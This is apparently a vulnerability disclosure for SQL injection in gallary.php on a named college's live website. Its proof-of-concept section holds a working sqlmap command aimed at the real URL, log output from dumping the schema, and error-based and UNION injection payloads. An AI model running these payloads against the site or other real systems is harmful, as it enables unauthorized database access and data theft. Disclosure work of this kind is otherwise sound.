# 🔥 SQL Injection in John XXIII College Website (gallary.php)

## 💡 Summary

A **critical SQL Injection** vulnerability exists in the `gallary.php` endpoint of the official John XXIII College India website: https://www.johnxxiii.co.in/php/gallary.php?id=1




The `id` parameter fails to sanitize user input, allowing attackers to inject raw SQL statements and fully enumerate backend databases. This vulnerability has been confirmed using `sqlmap`, with four injection vectors successfully detected.

---

## 📍 Vulnerability Details

- **Vulnerable Parameter**: `id` (GET)
- **Affected URL**: `/php/gallary.php?id=`
- **Backend DBMS**: MySQL (Percona)
- **App Stack**: Apache + PHP 7.4.10
- **Injection Types**:
  - ✅ Boolean-based Blind
  - ✅ Error-based (FLOOR RAND)
  - ✅ Time-based Blind
  - ✅ UNION query (13 columns)

---

## 🧪 Proof of Concept (PoC)

### Using sqlmap to confirm and extract schema data:
```bash                            `
sqlmap -u "https://www.johnxxiii.co.in/php/gallary.php?id=1" -D information_schema --dump-all --batch

Output Snippet (from session logs):
[INFO] the back-end DBMS is MySQL
[INFO] fetching tables for database: 'information_schema'
[INFO] retrieved: 'QUERY_ID','int(20)'
...
[INFO] retrieved: 'SOURCE_FILE','varchar(20)'
[INFO] retrieved: 'SOURCE_LINE','int(20)'
...
[INFO] table 'information_schema.PROFILING' dumped to CSV file: /home/kali/.local/share/sqlmap/output/www.johnxxiii.co.in/dump/information_schema/PROFILING.csv

Confirmed SQL Injection Payloads:

id=1 OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7162716a71, (SELECT (ELT(1=1,1))), 0x7162766a71, FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

id=1 UNION ALL SELECT NULL,NULL,...,CONCAT('qzvq', 'payload', 'qxpx'),NULL,NULL-- ```



🔥 Impact

This vulnerability allows:

    🛢️ Full MySQL database enumeration

    🔐 Access to schema-level metadata, including table/column names

    🚨 High risk of data exfiltration if exploited beyond schema

    ⚖️ Violation of common data protection practices (DPDP, GDPR)

🔒 Mitigation

    Sanitize inputs using parameterized queries

    Apply strict input validation on all GET/POST parameters

    Use a Web Application Firewall (WAF) to block automated injection patterns

    Disable unnecessary INFORMATION_SCHEMA exposure in production

📎 Disclosure Timeline
Date	Event
April 2025	Vulnerability discovered
May 2025	Full schema dump performed on information_schema via PoC
May 2025	Submitted to VulDB and CVE via MITRE
TBA	CVE ID to be assigned
🤝 Disclosure Statement

    This vulnerability was discovered and verified using only publicly available tools

    No unauthorized access to sensitive data or user accounts was attempted

    Disclosure performed responsibly by Soyam Arya (@hc4)

Video POC :  https://drive.google.com/file/d/1QpX82BUxWqg-lWbMUtnKwryZCqnkRmSk/view?usp=sharing

👨‍💻 Credits

    Researcher: Soyam Arya (hc4)

    GitHub: honestcorrupt

    LinkedIn: linkedin.com/in/soyam-arya-a90356312

    Contact: soyamarya96ethical@gmail.com


